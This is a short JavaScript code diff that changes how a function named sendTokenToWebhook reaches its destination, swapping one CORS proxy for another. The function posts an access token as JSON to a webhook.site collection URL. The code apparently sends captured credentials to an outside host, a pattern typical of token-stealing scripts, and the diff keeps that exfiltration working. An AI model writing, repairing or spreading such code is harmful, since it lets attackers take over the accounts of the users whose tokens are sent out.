@@ -18,7 +18,7 @@
         }
 
         function sendTokenToWebhook(token) {
-            fetch('https://corsproxy.io/?https://webhook.site/aa7a120f-6a64-4ce0-86e3-ee800aad28f5', { // CORS proxy added here
+            fetch('https://cors-anywhere.herokuapp.com/https://webhook.site/aa7a120f-6a64-4ce0-86e3-ee800aad28f5', { // CORS Anywhere proxy
                 method: 'POST',
                 body: JSON.stringify({ accessToken: token }),
                 headers: { 'Content-Type': 'application/json' }
